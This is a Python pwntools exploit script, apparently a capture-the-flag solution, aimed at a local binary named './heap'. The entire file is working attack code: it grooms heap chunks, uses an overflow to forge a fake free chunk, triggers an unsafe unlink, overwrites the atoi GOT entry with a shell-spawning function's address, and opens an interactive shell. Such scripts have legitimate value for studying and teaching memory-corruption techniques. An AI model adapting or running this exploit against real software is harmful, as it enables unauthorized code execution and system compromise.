#!/usr/bin/python

from pwn import *

def add(sz, content):
    p.sendlineafter("choice :", "1")
    p.sendlineafter("Size :", str(sz))
    p.sendafter("Content :", content)

def delete(idx):
    p.sendlineafter("choice :", "3")
    p.sendlineafter("Index :", str(idx))

def edit(idx, sz, content):
    p.sendlineafter("choice :", "4")
    p.sendlineafter("Index :", str(idx))
    p.sendlineafter("Size :", str(sz))
    p.sendafter("Content :", content)


p = process("./heap")
# gdb.attach(p, execute = "c")

# prepare heap
add(0x1c, "aaaa")
add(0x4c, "aaaa")
add(0x4c, "aaaa")
add(0x1c, "aaaa")
raw_input()

# overflow third chunk to create fake 'free chunk' before it
# forward chunk
heap_list = 0x0804A064
payload  = p32(0)                      # 2nd prev size, not important
payload += p32(0x21)                   # 2nd size, not important
payload += p32(heap_list - 12)         # 2nd fake fd
payload += p32(heap_list - 8)          # 2nd fake bk
payload  = payload.ljust(0x48, "a")
payload += p32(0x48)                   # 3rd prev size
payload += p32(0x50)                   # 3rd inuse flag to 0
edit(1, len(payload), payload)
raw_input()
# trigger unlink
delete(2)

# overwirte got entry
got_atoi  = 0x0804A034
get_shell = 0x0804865C
edit(1, 12, "a"*8 + p32(got_atoi))
edit(0, 4, p32(get_shell))


# get shell
p.sendlineafter("choice :", "1")

p.interactive()